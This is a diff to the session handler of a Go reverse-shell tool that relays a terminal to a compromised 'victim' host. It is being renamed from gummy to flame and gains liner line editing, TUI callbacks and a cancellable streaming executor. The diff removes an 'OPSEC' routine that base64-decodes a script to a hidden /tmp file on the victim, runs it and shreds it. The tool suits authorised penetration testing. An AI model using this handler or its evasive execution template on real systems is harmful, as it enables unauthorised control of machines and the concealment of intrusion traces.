@@ -1,8 +1,7 @@
 package internal
 
 import (
-	"bufio"
-	"encoding/base64"
+	"context"
 	"fmt"
 	"io"
 	"net"
@@ -12,22 +11,26 @@ import (
 	"syscall"
 	"time"
 
-	"github.com/chsoares/gummy/internal/ui"
+	"github.com/chsoares/flame/internal/ui"
+	"github.com/peterh/liner"
 	"golang.org/x/term"
 )
 
 // Handler gerencia uma sessão de reverse shell
 // A vítima já enviou uma shell conectada, nós fazemos relay do I/O
 type Handler struct {
-	conn         net.Conn      // Conexão com a vítima (que já tem shell rodando)
-	sessionID    string        // ID da sessão para logs
-	originalTerm *term.State   // Estado original do terminal para restaurar
-	onClose      func(string)  // Callback quando conexão fechar
-	platform     string        // Platform detected ("windows", "linux", "unknown")
-	ptyUpgrader  *PTYUpgrader  // PTY upgrader (for resize handler cleanup)
-	logWriter    *os.File      // Optional log file for session I/O
-	relayDone    chan struct{} // Signal to stop relayRemoteToLocal when exiting shell
-	lastCmd      chan string   // Last command sent, so relay can suppress PS echo
+	conn         net.Conn     // Conexão com a vítima (que já tem shell rodando)
+	sessionID    string       // ID da sessão para logs
+	originalTerm *term.State  // Estado original do terminal para restaurar
+	onClose      func(string) // Callback quando conexão fechar
+	onNotify     func(string) // Output pane callback para TUI
+	onNotifyBar  func(string) // Status bar callback para TUI
+	platform     string       // Platform detected ("windows", "linux", "unknown")
+	shellFlavor  string       // Shell flavor hint (ssh, csharp, etc.)
+	ptyUpgrader  *PTYUpgrader // PTY upgrader (for resize handler cleanup)
+	logWriter    *os.File     // Optional log file for session I/O
+	viewportCols int          // Override PTY cols for TUI mode (0 = auto)
+	viewportRows int          // Override PTY rows for TUI mode (0 = auto)
 }
 
 // NewHandler cria um novo handler para reverse shell
@@ -39,6 +42,8 @@ func NewHandler(conn net.Conn, sessionID string) *Handler {
 		sessionID:    sessionID,
 		originalTerm: nil,
 		onClose:      nil,
+		onNotify:     nil,
+		onNotifyBar:  nil,
 	}
 }
 
@@ -47,9 +52,35 @@ func (h *Handler) SetCloseCallback(callback func(string)) {
 	h.onClose = callback
 }
 
+// SetNotifyCallback sends fallback messages to the output pane in TUI mode.
+func (h *Handler) SetNotifyCallback(callback func(string)) {
+	h.onNotify = callback
+}
+
+// SetNotifyBarCallback sends fallback messages to the status bar in TUI mode.
+func (h *Handler) SetNotifyBarCallback(callback func(string)) {
+	h.onNotifyBar = callback
+}
+
+// SetViewportSize sets PTY dimensions for TUI mode (viewport instead of full terminal).
+func (h *Handler) SetViewportSize(cols, rows int) {
+	h.viewportCols = cols
+	h.viewportRows = rows
+}
+
+// IsPTYUpgraded returns true if the session has a PTY upgrade active.
+func (h *Handler) IsPTYUpgraded() bool {
+	return h.ptyUpgrader != nil
+}
+
 // SetPlatform define a plataforma detectada (chamado antes de Start())
 func (h *Handler) SetPlatform(platform string) {
 	h.platform = platform
+}
+
+// SetShellFlavor defines the shell flavor hint.
+func (h *Handler) SetShellFlavor(flavor string) {
+	h.shellFlavor = flavor
 }
 
 // SetLogWriter sets the log file for session I/O logging
@@ -92,11 +123,11 @@ func (h *Handler) Start() error {
 	// Remove timeout após conectar
 	h.conn.SetReadDeadline(time.Time{})
 
-	// Tenta upgrade PTY apenas se não for Windows
+	// Tenta upgrade PTY apenas quando permitido pela plataforma/flavor.
 	// Se bem-sucedido, ativa raw mode (como o Penelope faz)
 	ptySuccess := false
-	if h.platform != "windows" {
-		ptySuccess = h.attemptPTYUpgrade()
+	if shouldAttemptPTYUpgrade(h.platform, h.shellFlavor) {
+		ptySuccess = h.AttemptPTYUpgrade()
 	}
 
 	// Se PTY upgrade funcionou, ativa raw mode
@@ -113,7 +144,6 @@ func (h *Handler) Start() error {
 
 	// Inicia goroutines para relay bidirecional de I/O
 	errorChan := make(chan error, 2)
-	h.relayDone = make(chan struct{})
 
 	// Se temos PTY (raw mode), usa relay normal
 	// Se não temos PTY, usa readline loop (line-buffered)
@@ -121,12 +151,10 @@ func (h *Handler) Start() error {
 		// Modo PTY: raw input, relay direto
 		go h.relayLocalToRemote(errorChan)
 	} else {
-		// Cooked mode: remote output (including prompt) flows to stdout.
-		// bufio.Scanner reads lines with terminal echo.
-		// Cursor stays after the remote prompt.
-		h.lastCmd = make(chan string, 1)
-		// Send initial newline to trigger the first prompt from the remote shell
-		h.conn.Write([]byte("\n"))
+		// Modo readline: line-buffered input, Ctrl-D para sair
+		// Envia comando vazio para forçar exibição do prompt
+		h.conn.Write([]byte("\r\n"))
+		time.Sleep(200 * time.Millisecond) // Aguarda prompt aparecer
 		go h.readlineLoop(errorChan)
 	}
 
@@ -136,20 +164,6 @@ func (h *Handler) Start() error {
 	// Aguarda até uma das goroutines terminar (erro ou EOF)
 	err = <-errorChan
 
-	// Stop the relay goroutine so output doesn't leak into the menu
-	close(h.relayDone)
-
-	// Drain any pending output briefly to avoid stale data on next shell entry
-	h.conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
-	drain := make([]byte, 4096)
-	for {
-		_, derr := h.conn.Read(drain)
-		if derr != nil {
-			break
-		}
-	}
-	h.conn.SetReadDeadline(time.Time{})
-
 	// Notifica que conexão fechou se callback foi definido
 	if h.onClose != nil && err != nil && err != io.EOF {
 		h.onClose(h.sessionID)
@@ -158,45 +172,91 @@ func (h *Handler) Start() error {
 	return err
 }
 
-// readlineLoop reads input line by line for non-PTY shells (e.g. Windows PowerShell).
-// Uses normal terminal mode (cooked) so the terminal itself handles echo and basic
-// line editing (backspace). Remote output (including prompt) flows to stdout via
-// relayRemoteToLocal. The cursor stays where the last stdout write left off,
-// so typing appears right after the remote prompt.
+// readlineLoop lê input linha por linha (para shells não-PTY como PowerShell)
+// Usa liner para edição de linha com suporte a setas
 func (h *Handler) readlineLoop(errorChan chan error) {
-	scanner := bufio.NewScanner(os.Stdin)
+	// Cria instância liner
+	line := liner.NewLiner()
+	defer line.Close()
+
+	// Configura comportamento
+	line.SetCtrlCAborts(false) // Ctrl-C não aborta (gera erro especial)
+	line.SetMultiLineMode(false)
+	line.SetBeep(false) // Sem beep em erros
+
+	// Carrega histórico se existir (da sessão do menu principal)
+	historyPath := appDataPath("shell_history")
+	if f, err := os.Open(historyPath); err == nil {
+		line.ReadHistory(f)
+		f.Close()
+	}
+
+	// Channel para capturar Ctrl-C
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT)
+	defer signal.Stop(sigChan)
+
+	// Goroutine para processar Ctrl-C
+	ctrlCPressed := make(chan struct{}, 1)
+	go func() {
+		for range sigChan {
+			// Notifica que Ctrl-C foi pressionado
+			select {
+			case ctrlCPressed <- struct{}{}:
+			default:
+			}
+		}
+	}()
 
 	for {
-		if !scanner.Scan() {
-			// EOF (Ctrl-D) or error
-			if err := scanner.Err(); err != nil {
-				errorChan <- fmt.Errorf("stdin error: %w", err)
-			} else {
-				// Clean EOF = Ctrl-D
+		// Tenta ler linha
+		input, err := line.Prompt("")
+
+		// Verifica se Ctrl-C foi pressionado
+		select {
+		case <-ctrlCPressed:
+			// Envia ^C para shell remota
+			h.conn.Write([]byte{0x03})
+			fmt.Println("^C")
+			continue
+		default:
+		}
+
+		if err != nil {
+			if err == liner.ErrPromptAborted {
+				// Ctrl-C durante o prompt
+				h.conn.Write([]byte{0x03})
+				fmt.Println("^C")
+				continue
+			}
+
+			if err == io.EOF {
+				// Ctrl-D - save history and exit
+				if f, err := os.Create(historyPath); err == nil {
+					line.WriteHistory(f)
+					f.Close()
+				}
 				fmt.Print(ui.ReturningToMenu())
 				errorChan <- io.EOF
+				return
 			}
+
+			// Erro real
+			errorChan <- fmt.Errorf("liner error: %w", err)
 			return
 		}
 
-		line := scanner.Text()
+		// Adiciona ao histórico local
+		line.AppendHistory(input)
 
-		// Tell the relay to suppress the echo of this command
-		if h.lastCmd != nil && line != "" {
-			select {
-			case h.lastCmd <- line:
-			default:
-				// Drain old and send new
-				select {
-				case <-h.lastCmd:
-				default:
-				}
-				h.lastCmd <- line
-			}
-		}
-
-		_, writeErr := h.conn.Write([]byte(line + "\n"))
+		// Envia linha completa
+		_, writeErr := h.conn.Write([]byte(input + "\n"))
 		if writeErr != nil {
+			// Save history before exiting
+			if f, err := os.Create(historyPath); err == nil {
+				line.WriteHistory(f)
+				f.Close()
+			}
 			errorChan <- fmt.Errorf("write to remote error: %w", writeErr)
 			return
 		}
@@ -261,20 +321,8 @@ func (h *Handler) containsF12(data []byte) bool {
 func (h *Handler) relayRemoteToLocal(errorChan chan error) {
 	buffer := make([]byte, 4096)
 	for {
-		// Check if we should stop (shell exited back to menu)
-		select {
-		case <-h.relayDone:
-			return
-		default:
-		}
-
-		// Use a short read deadline so we can check relayDone periodically
-		h.conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
 		n, err := h.conn.Read(buffer)
 		if err != nil {
-			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
-				continue // Just a timeout, check relayDone and retry
-			}
 			if err == io.EOF {
 				errorChan <- io.EOF
 			} else {
@@ -284,9 +332,6 @@ func (h *Handler) relayRemoteToLocal(errorChan chan error) {
 		}
 
 		output := h.normalizeOutput(buffer[:n])
-		if len(output) == 0 {
-			continue
-		}
 
 		// Tee to log file if configured
 		if h.logWriter != nil {
@@ -301,87 +346,55 @@ func (h *Handler) relayRemoteToLocal(errorChan chan error) {
 	}
 }
 
-
-// normalizeOutput normalizes line endings and prompt/echo handling for remote shells.
+// normalizeOutput aplica normalizações básicas para melhorar output de raw shells
 func (h *Handler) normalizeOutput(data []byte) []byte {
-	s := string(data)
+	// Para raw shells básicas, não fazemos muita normalização
+	// porque pode quebrar aplicações que dependem de sequências específicas
 
-	if h.platform == "windows" {
-		// Replace \r\n with \n to prevent double-spacing and tab drift
-		s = strings.ReplaceAll(s, "\r\n", "\n")
-	}
+	// Por enquanto, retorna dados como estão
+	// Em futuras versões, podemos adicionar:
+	// - Conversão \r\n para \n em algumas situações
+	// - Limpeza de sequências de controle malformadas
+	// - Etc.
 
-	// Suppress command echo: when the user sends "whoami", PowerShell echoes
-	// "PS C:\> whoami" back. Since the terminal already echoed the input locally,
-	// this line is redundant. Check if we have a pending command to suppress.
-	if h.lastCmd != nil {
-		select {
-		case cmd := <-h.lastCmd:
-			// Remove lines that look like a prompt + the echoed command
-			lines := strings.Split(s, "\n")
-			filtered := make([]string, 0, len(lines))
-			suppressed := false
-			for _, line := range lines {
-				trimmed := strings.TrimRight(line, " \r")
-				if !suppressed && strings.HasSuffix(trimmed, cmd) &&
-					(strings.HasPrefix(trimmed, "PS ") || strings.Contains(trimmed, "> "+cmd)) {
-					suppressed = true
-					continue // Skip this echo line
-				}
-				filtered = append(filtered, line)
-			}
-			s = strings.Join(filtered, "\n")
-			// Clean up double newlines left by echo removal
-			for strings.Contains(s, "\n\n") {
-				s = strings.ReplaceAll(s, "\n\n", "\n")
-			}
-		default:
-			// No command to suppress
-		}
-	}
-
-	// Strip trailing newline after shell prompts so the cursor stays on the
-	// prompt line and the user types right after it.
-	if strings.HasSuffix(s, "\n") {
-		lastNL := strings.LastIndex(s[:len(s)-1], "\n")
-		var lastLine string
-		if lastNL >= 0 {
-			lastLine = s[lastNL+1 : len(s)-1]
-		} else {
-			lastLine = s[:len(s)-1]
-		}
-		trimmed := strings.TrimRight(lastLine, " ")
-		isPrompt := (strings.HasPrefix(trimmed, "PS ") && strings.HasSuffix(trimmed, ">")) ||
-			strings.HasSuffix(trimmed, "$ ") || strings.HasSuffix(trimmed, "$") ||
-			strings.HasSuffix(trimmed, "# ") || strings.HasSuffix(trimmed, "#")
-		if isPrompt {
-			s = s[:len(s)-1] // Strip the trailing \n
-		}
-	}
-
-	// Don't output empty strings or bare newlines (artifacts from echo suppression)
-	if s == "" || s == "\n" {
-		return nil
-	}
-
-	return []byte(s)
+	return data
 }
 
-// attemptPTYUpgrade tenta fazer upgrade da shell para PTY
+// attemptPTYUpgrade is the internal name kept for the comment
 // Retorna true se bem-sucedido
-func (h *Handler) attemptPTYUpgrade() bool {
+// AttemptPTYUpgrade tries to upgrade the remote shell to a proper PTY.
+func (h *Handler) AttemptPTYUpgrade() bool {
 	upgrader := NewPTYUpgrader(h.conn, h.sessionID)
+
+	// Use viewport dimensions if set (TUI mode)
+	if h.viewportCols > 0 && h.viewportRows > 0 {
+		upgrader.SetSize(h.viewportCols, h.viewportRows)
+	}
 
 	err := upgrader.TryUpgrade()
 	if err == nil {
-		// PTY upgrade succeeded - drain setup output and start resize handler
+		// PTY upgrade succeeded - drain setup output
 		h.drainSetupOutput()
 		h.ptyUpgrader = upgrader
-		upgrader.SetupResizeHandler()
+		// Only start resize handler in non-TUI mode (TUI manages its own layout)
+		if h.viewportCols == 0 {
+			upgrader.SetupResizeHandler()
+		}
 		return true
 	}
 	// Falhou ou não foi possível fazer upgrade
+	msg := ui.PTYFailed()
+	if h.onNotify != nil {
+		h.onNotify(msg)
+	}
+	if h.onNotifyBar != nil {
+		h.onNotifyBar(msg)
+	}
 	return false
+}
+
+func shouldAttemptPTYUpgrade(platform, flavor string) bool {
+	return platform != "windows" && flavor != "ssh"
 }
 
 // drainSetupOutput drena output dos comandos de setup do PTY
@@ -589,7 +602,7 @@ func (h *Handler) ExecuteWithStreaming(cmd, localOutputPath string) error {
 	defer localFile.Close()
 
 	// Send command with a unique marker at the end
-	marker := fmt.Sprintf("__GUMMY_DONE_%d__", time.Now().UnixNano())
+	marker := fmt.Sprintf("__FLAME_DONE_%d__", time.Now().UnixNano())
 	fullCmd := fmt.Sprintf("%s\necho '%s'\n", cmd, marker)
 
 	_, err = h.conn.Write([]byte(fullCmd))
@@ -652,82 +665,117 @@ func (h *Handler) ExecuteWithStreaming(cmd, localOutputPath string) error {
 	return nil
 }
 
-// ExecuteScriptFromStdin executes script with minimal OPSEC footprint
-// Uses /tmp/ briefly (file exists for ~seconds), but gives clean output
-func (h *Handler) ExecuteScriptFromStdin(interpreter, args string, scriptData []byte, localOutputPath string) error {
-	// Create local output file
+// ExecuteWithStreamingCtx is like ExecuteWithStreaming but can be cancelled via context.
+// When cancelled, it clears the read deadline and returns — the connection is free.
+// Used for interruptible operations like tailing module output.
+func (h *Handler) ExecuteWithStreamingCtx(ctx context.Context, cmd, localOutputPath string) error {
 	localFile, err := os.Create(localOutputPath)
 	if err != nil {
 		return fmt.Errorf("failed to create local file: %w", err)
 	}
 	defer localFile.Close()
 
-	// Use /tmp/ with hidden filename
-	tempFile := fmt.Sprintf("/tmp/.gummy_%d", time.Now().UnixNano())
-	doneMarker := fmt.Sprintf("__GUMMY_DONE_%d__", time.Now().UnixNano())
+	marker := fmt.Sprintf("__FLAME_DONE_%d__", time.Now().UnixNano())
+	fullCmd := fmt.Sprintf("%s\necho '%s'\n", cmd, marker)
 
-	// Base64 encode to avoid any escaping issues
-	scriptB64 := base64.StdEncoding.EncodeToString(scriptData)
-
-	// Single line: decode to temp, execute, shred/delete
-	// This is clean, works reliably, and file exists briefly
-	fullCmd := fmt.Sprintf("echo %s|base64 -d>%s;%s %s%s;shred -uz %s 2>/dev/null||rm -f %s;echo %s\n",
-		scriptB64, tempFile, interpreter, tempFile, args, tempFile, tempFile, doneMarker)
-
-	_, err = h.conn.Write([]byte(fullCmd))
-	if err != nil {
+	if _, err := h.conn.Write([]byte(fullCmd)); err != nil {
 		return fmt.Errorf("failed to send command: %w", err)
 	}
 
-	// Read output in real-time until done marker
 	buffer := make([]byte, 4096)
 	var accumulated strings.Builder
-	h.conn.SetReadDeadline(time.Now().Add(5 * time.Minute))
 
 	for {
-		n, err := h.conn.Read(buffer)
-		if err != nil {
-			if err == io.EOF {
-				break
-			}
-			if accumulated.Len() > 0 && strings.Contains(accumulated.String(), doneMarker) {
-				break
-			}
-			return fmt.Errorf("read error: %w", err)
+		// Check for cancellation
+		select {
+		case <-ctx.Done():
+			h.conn.SetReadDeadline(time.Time{})
+			return ctx.Err()
+		default:
 		}
 
+		// Short read deadline so we can check context frequently
+		h.conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
+		n, err := h.conn.Read(buffer)
 		if n > 0 {
 			chunk := string(buffer[:n])
 			accumulated.WriteString(chunk)
 
-			// Write to local file immediately
-			localFile.WriteString(chunk)
-			localFile.Sync()
+			// Filter out the marker and echo command from output file
+			cleanChunk := filterStreamingChunk(chunk, marker)
+			if cleanChunk != "" {
+				localFile.WriteString(cleanChunk)
+				localFile.Sync()
+			}
 
-			// Check for done marker
-			if strings.Contains(accumulated.String(), doneMarker) {
+			if strings.Contains(accumulated.String(), marker) {
+				h.conn.SetReadDeadline(time.Time{})
+				return nil
+			}
+		}
+		if err != nil {
+			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+				continue // Just a timeout, check context and retry
+			}
+			if err == io.EOF {
 				break
 			}
+			h.conn.SetReadDeadline(time.Time{})
+			return fmt.Errorf("read error: %w", err)
 		}
 	}
 
 	h.conn.SetReadDeadline(time.Time{})
+	return nil
+}
 
-	// Clean output (remove done marker and shell noise)
-	finalContent := accumulated.String()
-
-	// Remove done marker
-	markerIndex := strings.Index(finalContent, doneMarker)
-	if markerIndex != -1 {
-		finalContent = finalContent[:markerIndex]
+func filterStreamingChunk(chunk, marker string) string {
+	cleanChunk := chunk
+	if strings.Contains(cleanChunk, marker) {
+		cleanChunk = strings.ReplaceAll(cleanChunk, marker, "")
+	}
+	if strings.Contains(cleanChunk, "echo '"+marker+"'") {
+		cleanChunk = strings.ReplaceAll(cleanChunk, "echo '"+marker+"'", "")
 	}
 
-	// Don't rewrite the file - leave raw output intact
-	// This prevents tail -f from showing duplicate content when file is truncated
-	// User can see raw output in real-time via tail -f in separate terminal
-	// If they want clean output later, they can manually clean it or use cat
+	cleanChunk = stripTrailingPromptOnlyLine(cleanChunk)
+	cleanChunk = strings.ReplaceAll(cleanChunk, "\n\n\n", "\n\n")
+	return cleanChunk
+}
 
-	return nil
+func stripTrailingPromptOnlyLine(s string) string {
+	trimmedNewline := strings.TrimRight(s, "\n")
+	if trimmedNewline == "" {
+		return s
+	}
+
+	lastNL := strings.LastIndex(trimmedNewline, "\n")
+	line := trimmedNewline
+	prefix := ""
+	if lastNL >= 0 {
+		prefix = trimmedNewline[:lastNL+1]
+		line = trimmedNewline[lastNL+1:]
+	}
+
+	line = strings.TrimRight(line, " ")
+	if isPromptOnlyLine(line) {
+		return prefix
+	}
+	return s
+}
+
+func isPromptOnlyLine(line string) bool {
+	line = strings.TrimSpace(line)
+	if line == "" {
+		return false
+	}
+	if strings.HasPrefix(line, "PS ") && strings.HasSuffix(line, ">") {
+		return true
+	}
+	if strings.HasSuffix(line, "$") || strings.HasSuffix(line, "#") || strings.HasSuffix(line, "%") {
+		return true
+	}
+	return false
 }
 
 // GetConnection returns the underlying connection
